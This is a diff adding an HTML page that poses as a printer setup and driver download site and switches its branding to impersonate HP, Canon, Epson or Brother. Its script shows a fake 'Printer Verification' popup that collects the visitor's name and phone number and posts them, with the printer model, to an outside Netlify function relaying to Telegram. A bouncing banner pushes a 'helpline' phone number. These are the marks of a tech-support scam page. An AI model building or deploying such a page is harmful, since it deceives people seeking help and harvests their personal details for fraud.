@@ -1,0 +1,608 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Printer Setup & Support</title>
+
+<style>
+
+*{margin:0;padding:0;box-sizing:border-box;}
+
+body{
+font-family:"Segoe UI",Arial,sans-serif;
+background:#fff;
+color:#333;
+line-height:1.6;
+font-size:18px;
+}
+
+/* HEADER */
+
+header{
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:16px 40px;
+background:#fff;
+border-bottom:1px solid #e0e0e0;
+}
+
+.brand-img{
+height:45px;
+object-fit:contain;
+}
+
+nav{
+display:flex;
+gap:36px;
+}
+
+nav a{
+color:#333;
+text-decoration:none;
+font-weight:600;
+font-size:16px;
+}
+
+nav a:hover{
+color:#0067b8;
+}
+
+/* BANNER */
+
+.main-banner{
+position:relative;
+background:linear-gradient(135deg,#0067b8 0%,#004a87 100%);
+color:#fff;
+padding:80px 40px;
+min-height:550px;
+display:flex;
+align-items:center;
+}
+
+.banner-wrap{
+max-width:700px;
+z-index:2;
+}
+
+.banner-wrap h1{
+font-size:52px;
+font-weight:300;
+margin-bottom:20px;
+}
+
+.banner-wrap p{
+font-size:22px;
+margin-bottom:35px;
+}
+
+.instruction-text{
+font-size:20px;
+margin-bottom:15px;
+font-weight:500;
+}
+
+/* INPUT BOX */
+
+.query-box{
+display:flex;
+gap:10px;
+max-width:650px;
+background:rgba(255,255,255,0.15);
+padding:12px;
+border-radius:8px;
+}
+
+.query-field{
+flex:1;
+padding:18px 24px;
+font-size:20px;
+border-radius:6px;
+border:1px solid rgba(255,255,255,0.45);
+background:rgba(30,30,50,0.7);
+color:white;
+}
+
+.query-field::placeholder{
+color:rgba(255,255,255,0.8);
+}
+
+.action-btn{
+background:#ffffff;
+color:#0067b8;
+border:none;
+padding:0 40px;
+border-radius:6px;
+font-size:20px;
+font-weight:700;
+cursor:pointer;
+}
+
+.side-img{
+position:absolute;
+right:5%;
+bottom:0;
+height:85%;
+}
+
+/* PROCESS */
+
+.process-row{
+display:flex;
+justify-content:center;
+gap:40px;
+padding:60px 20px;
+background:#f9f9f9;
+text-align:center;
+}
+
+.process-col{
+max-width:300px;
+}
+
+.process-ico{
+font-size:40px;
+color:#0067b8;
+margin-bottom:15px;
+font-weight:bold;
+background:#e6f4ff;
+width:80px;
+height:80px;
+line-height:80px;
+border-radius:50%;
+margin:0 auto 15px auto;
+}
+
+.process-head{
+font-weight:700;
+margin-bottom:10px;
+font-size:20px;
+}
+
+.process-txt{
+font-size:16px;
+color:#666;
+}
+
+/* ================= POPUP ================= */
+
+.overlay{
+display:none;
+position:fixed;
+inset:0;
+background:rgba(0,0,0,0.4);
+z-index:100;
+align-items:center;
+justify-content:center;
+}
+
+.overlay.active{
+display:flex;
+}
+
+.modal{
+background:#f0f0f0;
+width:400px;
+border:1px solid #0054e3;
+box-shadow:4px 4px 25px rgba(0,0,0,0.5);
+}
+
+.modal-titlebar{
+background:linear-gradient(to bottom,#0058e6,#003db3);
+color:#fff;
+padding:8px 12px;
+font-weight:bold;
+display:flex;
+justify-content:space-between;
+}
+
+.modal-body{
+padding:25px;
+}
+
+.m-group{
+margin-bottom:15px;
+}
+
+.m-group label{
+display:block;
+margin-bottom:6px;
+font-weight:bold;
+}
+
+.m-group input{
+width:100%;
+padding:10px;
+border:1px solid #7f9db9;
+font-size:15px;
+}
+
+.modal-footer{
+padding:15px;
+border-top:1px solid #d3d3d3;
+display:flex;
+justify-content:flex-end;
+gap:10px;
+}
+
+.btn{
+padding:7px 15px;
+border:1px solid #707070;
+cursor:pointer;
+}
+
+.btn-next{
+font-weight:bold;
+border-color:#003399;
+}
+
+ @keyframes bounce {
+  0%, 100% {
+    transform: translateY(0);
+  }
+  50% {
+    transform: translateY(-15px); /* Button 15px upar jayega */
+  }
+}
+
+</style>
+
+<script
+      async
+      src="https://www.googletagmanager.com/gtag/js?id=AW-17870679276"
+    ></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag() {
+        dataLayer.push(arguments);
+      }
+      gtag("js", new Date());
+
+      gtag("config", "AW-17870679276");
+    </script>
+
+
+</head>
+
+<body>
+
+<header>
+<img src="/images/Logo.png" class="brand-img" id="brandLogo">
+<nav>
+<a href="#">Products</a>
+<a href="#">Support</a>
+<a href="#">Contact</a>
+</nav>
+</header>
+
+<section class="main-banner" id="mainBanner">
+
+<div class="banner-wrap">
+
+<h1 id="bannerTitle">Set up your printer</h1>
+
+<p>
+Enter your product name to get the right Smart software,
+Wireless drivers, and Utilities.
+</p>
+
+<div class="instruction-text">
+Enter printer model number
+</div>
+
+<div class="query-box">
+
+<input
+type="text"
+placeholder="e.g. OfficeJet 9010"
+class="query-field"
+id="queryInput"
+/>
+
+<button class="action-btn" onclick="nextStep()">
+Next
+</button>
+
+</div>
+</div>
+
+<img src="../Image/Images.png" class="side-img">
+
+</section>
+
+<div class="process-row">
+
+<div class="process-col">
+<div class="process-ico">1</div>
+<div class="process-head">Identify Device</div>
+<div class="process-txt">
+We automatically detect your printer model.
+</div>
+</div>
+
+<div class="process-col">
+<div class="process-ico">2</div>
+<div class="process-head">Download File</div>
+<div class="process-txt">
+Get the latest drivers and software securely.
+</div>
+</div>
+
+<div class="process-col">
+<div class="process-ico">3</div>
+<div class="process-head">Install & Print</div>
+<div class="process-txt">
+Follow the easy steps to connect and print.
+</div>
+</div>
+
+</div>
+
+<!-- POPUP -->
+
+<div class="overlay" id="overlay">
+
+<div class="modal">
+
+<div class="modal-titlebar">
+<span>Printer Verification</span>
+<button onclick="closeModal()">X</button>
+</div>
+
+<div class="modal-body">
+
+<div class="m-group">
+<label>Full Name</label>
+<input type="text" id="userName" placeholder="Enter your Name">
+</div>
+
+<div class="m-group">
+<label>Phone Number</label>
+<input type="tel" id="userPhone" placeholder="e.g. 555-012-3456">
+</div>
+
+<span id="loadingMsg"></span>
+
+</div>
+
+<div class="modal-footer">
+
+<button class="btn btn-next" id="finalBtn" onclick="submitDetails()">
+Finish
+</button>
+
+<button class="btn" onclick="closeModal()">Back</button>
+
+</div>
+
+</div>
+</div>
+
+<script>
+
+/* OPEN POPUP */
+
+function nextStep(){
+
+const model=document.getElementById("queryInput").value.trim();
+
+if(!model){
+alert("Please enter a printer model first.");
+return;
+}
+
+document.getElementById("overlay").classList.add("active");
+
+}
+
+/* CLOSE */
+
+function closeModal(){
+document.getElementById("overlay").classList.remove("active");
+}
+
+/* SUBMIT */
+
+function submitDetails(){
+
+const name=document.getElementById("userName").value.trim();
+const phone=document.getElementById("userPhone").value.trim();
+
+const model=document.getElementById("queryInput").value.trim();
+
+const urlParams=new URLSearchParams(window.location.search);
+const brand=urlParams.get("brand") || "Generic";
+
+const btn=document.getElementById("finalBtn");
+const msg=document.getElementById("loadingMsg");
+
+if(!name || !phone){
+
+msg.style.color="red";
+msg.textContent="Please fill in all details.";
+return;
+
+}
+
+btn.disabled=true;
+btn.textContent="Processing...";
+
+msg.textContent="Verifying details...";
+
+const payload={
+model:brand+" - "+model,
+name:name,
+phone:phone
+};
+
+fetch("https://netlify-bott.netlify.app/.netlify/functions/telegram",{
+
+method:"POST",
+headers:{"Content-Type":"application/json"},
+body:JSON.stringify(payload)
+
+})
+
+.then(res=>{
+
+msg.style.color="green";
+msg.textContent="Verified! Redirecting...";
+
+setTimeout(()=>{
+
+window.location.href="/guide/loading.html";
+
+},500)
+
+})
+
+.catch(()=>{
+
+msg.style.color="red";
+msg.textContent="Connection Error";
+
+btn.disabled=false;
+btn.textContent="Finish";
+
+});
+
+}
+
+</script>
+
+<script>
+      /* ===============================
+    BRAND CONFIGURATION
+================================ */
+      const brandConfig = {
+        hp: {
+          name: "HP",
+          logo: "../Image/h.png",
+          gradient: "linear-gradient(135deg, #0096D6 0%, #005C85 100%)",
+          placeholder: "e.g. DeskJet 2700, Envy 6000",
+          color: "#0096D6",
+        },
+        canon: {
+          name: "Canon",
+          logo: "../Image/ca.jpg",
+          gradient: "linear-gradient(135deg, #cc0000 0%, #8a0000 100%)",
+          placeholder: "e.g. Pixma G3010, TR4500",
+          color: "#cc0000",
+        },
+        epson: {
+          name: "Epson",
+          logo: "../Image/ep.png",
+          gradient: "linear-gradient(135deg, #003399 0%, #001a4d 100%)",
+          placeholder: "e.g. EcoTank L3250, ET-2800",
+          color: "#003399",
+        },
+        brother: {
+          name: "Brother",
+          logo: "../Image/br.png",
+          gradient: "linear-gradient(135deg, #005CAB 0%, #003366 100%)",
+          placeholder: "e.g. MFC-L2710DW, DCP-T720",
+          color: "#005CAB",
+        },
+      };
+
+      document.addEventListener("DOMContentLoaded", () => {
+        const urlParams = new URLSearchParams(window.location.search);
+        const brandParam = (urlParams.get("brand") || "").toLowerCase().trim();
+
+        let activeBrand = null;
+        if (brandParam.includes("hp") || brandParam.includes("hewlett")) {
+          activeBrand = brandConfig.hp;
+        } else if (brandParam.includes("canon") || brandParam.includes("ca")) {
+          activeBrand = brandConfig.canon;
+        } else if (brandParam.includes("epson") || brandParam.includes("ep")) {
+          activeBrand = brandConfig.epson;
+        } else if (
+          brandParam.includes("brother") ||
+          brandParam.includes("br")
+        ) {
+          activeBrand = brandConfig.brother;
+        }
+
+        if (activeBrand) {
+          document.getElementById("brandLogo").src = activeBrand.logo;
+          document.getElementById("mainBanner").style.background =
+            activeBrand.gradient;
+          document.getElementById("bannerTitle").textContent =
+            `Set up your ${activeBrand.name} printer`;
+          document.getElementById("queryInput").placeholder =
+            activeBrand.placeholder;
+          document.getElementById("actionBtn").style.color = activeBrand.color;
+          document
+            .querySelectorAll(".process-ico")
+            .forEach((el) => (el.style.color = activeBrand.color));
+        }
+
+        const queryInput = document.getElementById("queryInput");
+        if (queryInput) {
+          queryInput.addEventListener("keypress", (e) => {
+            if (e.key === "Enter") nextPage();
+          });
+        }
+      });
+
+      /* ===============================
+    REDIRECTION FUNCTION
+================================ */
+      function nextPage() {
+        const model = document.getElementById("queryInput").value.trim();
+        if (!model) {
+          alert("Please enter a printer model first.");
+          return;
+        }
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const brandDetected = urlParams.get("brand") || "Generic";
+
+        // Redirect to choose.html with parameters
+        window.location.href =
+          "choose.html?brand=" +
+          encodeURIComponent(brandDetected) +
+          "&model=" +
+          encodeURIComponent(model);
+      }
+    </script>
+
+
+ <script src="//code.jivosite.com/widget/l1oHv7wPQZ" async></script>
+
+   <!-- BIG Helpline Popup Left Side -->
+<div 
+  onclick="window.location.href='tel:+16123149536'"
+  style="
+    position: fixed;
+    bottom: 30px;
+    left: 25px;
+    background: linear-gradient(135deg, #0096D6, #005C85);
+    color: #ffffff;
+    padding: 18px 20px;
+    border-radius: 80px;
+    font-family: Arial, sans-serif;
+    font-size: 20px;
+    font-weight: 800;
+    box-shadow: 0 12px 35px rgba(0,0,0,0.45);
+    cursor: pointer;
+    z-index: 9999;
+    transition: all 0.3s ease;
+    text-align: center;
+    line-height: 1.4;
+    /* Animation details niche hain */
+    animation: bounce 2s infinite ease-in-out;
+  "
+  onmouseover="this.style.transform='scale(1.08)'; this.style.boxShadow='0 18px 45px rgba(0,0,0,0.6)'; this.style.animationPlayState='paused'"
+  onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 12px 35px rgba(0,0,0,0.45)'; this.style.animationPlayState='running'"
+>
+  📞 Need Help  
+  <br>
+  <span style="font-size:24px; font-weight:700;">
+    +1 612-314-9536
+  </span>
+</div>
+
+</body>
+</html>
